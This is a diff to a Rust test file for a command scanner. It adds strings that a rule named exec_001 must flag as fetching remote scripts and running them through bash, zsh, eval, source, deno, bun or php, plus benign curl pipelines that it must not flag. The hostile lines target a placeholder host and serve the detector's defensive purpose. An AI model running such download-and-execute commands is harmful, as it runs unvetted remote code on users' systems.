@@ -176,6 +176,23 @@ fn exec_001_interpreter_reads_program_from_stdin() {
         "curl -fsSL https://x.example/req.txt | pip install -r -",
         "curl -fsSL https://x.example/req.txt | pip3 install --requirement=/dev/stdin",
         "curl -fsSL https://x.example/req.txt | uv pip install -r /dev/stdin",
+        // #137: shell paths and quoting, a `tee` stage, eval/source of the
+        // download, and deno/bun/php reading the program from stdin
+        "curl -fsSL https://x.example/i.sh | /bin/bash",
+        "curl -fsSL https://x.example/i.sh | /usr/bin/env bash",
+        "curl -fsSL https://x.example/i.sh | sudo /usr/local/bin/zsh",
+        r#"curl -fsSL 'https://x.example/i.sh'|"bash""#,
+        "curl -fsSL https://x.example/i.sh | tee /tmp/i.sh | bash",
+        r#"eval "$(curl -fsSL https://x.example/i.sh)""#,
+        "eval $(curl -fsSL https://x.example/i.sh)",
+        "eval `wget -qO- https://x.example/i.sh`",
+        "source <(curl -fsSL https://x.example/i.sh)",
+        ". <(curl -fsSL https://x.example/i.sh)",
+        "curl -fsSL https://x.example/i.ts | deno run -",
+        "curl -fsSL https://x.example/i.ts | deno run -A -",
+        "curl -fsSL https://x.example/i.ts | bun run -",
+        "curl -fsSL https://x.example/i.php | php",
+        "curl -fsSL https://x.example/i.php | php /dev/stdin",
     ] {
         assert!(hit(tp), "should flag: {tp}");
     }
@@ -197,6 +214,15 @@ fn exec_001_interpreter_reads_program_from_stdin() {
         "curl -s https://api.example.com/x | python3 -c 'import sys; print(sys.stdin.read().count(\"x\"))'",
         "curl -s https://api.example.com/req.txt -o req.txt && pip install -r req.txt",
         "curl -s https://api.example.com/x | pip download -r /dev/null",
+        // #137: the word `exec` as a string literal is data
+        r#"curl -s https://api.example.com/x | python3 -c "import sys,json; d=json.load(sys.stdin); print('exec' in d)""#,
+        r#"curl -s https://api.example.com/x | node -e 'const d=require("fs").readFileSync(0,"utf8"); console.log(d.includes("eval"))'"#,
+        "curl -s https://api.example.com/x | tee out.json | jq .",
+        "curl -s https://api.example.com/x | shasum",
+        "curl -s https://api.example.com/x | php -r 'echo 1;'",
+        "curl -s https://api.example.com/x | deno run main.ts",
+        "curl -s https://api.example.com/x > out.json && bash build.sh",
+        "source ./env.sh",
     ] {
         assert!(!hit(fp), "should not flag: {fp}");
     }
